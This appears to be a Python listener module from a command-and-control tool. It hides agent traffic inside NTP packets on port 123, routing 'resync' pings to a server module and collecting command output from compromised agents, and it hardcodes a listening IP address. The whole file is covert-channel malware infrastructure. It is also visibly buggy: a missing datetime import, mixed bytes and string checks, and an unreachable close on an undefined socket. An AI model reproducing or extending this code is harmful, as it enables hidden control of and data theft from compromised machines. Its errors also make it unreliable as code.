"""
sole purpose is to listen consistenty for NTP traffic
if resync is recieved, send to ntpserver.py
if cmdoutput is received, send to c2.py
"""
import socket

from server import ntpserver, c2


def start(agentDB):
    while True:
        ip = "129.21.100.241" #TODO change to get my ip
        port = 123

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((ip, port))


        datahold = ""
        while True:
            data, addr = sock.recvfrom(2048)
            ip = addr[0]

            strdata = c2.decode(data)

            if "COM".encode('utf-8') in strdata:
                idx = strdata.index("COM")
                datahold += strdata[idx+4:]
                if "COMQ" in strdata:
                    c2.getCMDOutput()
                    datahold = ""

            else: #this means resync/ping
                timestamp = ("{:%Y-%m-%d %H:%M:%S}".format(datetime.datetime.now()))
                ntpserver.resyncReceived(timestamp, ip, agentDB)


    s.close()


